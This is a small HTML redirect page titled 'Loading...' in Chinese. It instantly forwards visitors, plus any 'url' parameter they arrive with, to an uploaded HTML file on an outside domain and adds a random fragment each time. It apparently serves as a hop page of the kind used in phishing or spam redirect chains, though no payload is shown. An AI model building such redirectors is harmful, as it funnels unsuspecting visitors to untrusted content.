<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta http-equiv="refresh" content="0; URL=https://group.seemse.com/profile/upload/7bc99877-50ed-4dbd-af15-bdf7d8066b97.html">
<title>正在加载...</title>
<script>
// 获取 URL 参数
const queryString = window.location.search;
const urlParams = new URLSearchParams(queryString);
const customParam = urlParams.get('url');

// 生成随机数字和英文组合
const randomString = Math.random().toString(36).substring(2); // 生成随机字符串，包括数字和小写字母

// 构建跳转链接
let redirectURL = "https://group.seemse.com/profile/upload/7bc99877-50ed-4dbd-af15-bdf7d8066b97.html";
if (customParam) {
redirectURL += "?url=" + customParam + "#" + randomString; // 将随机字符串添加到参数后面
}

// 执行跳转
window.location.href = redirectURL;
</script>
</head>

</html>
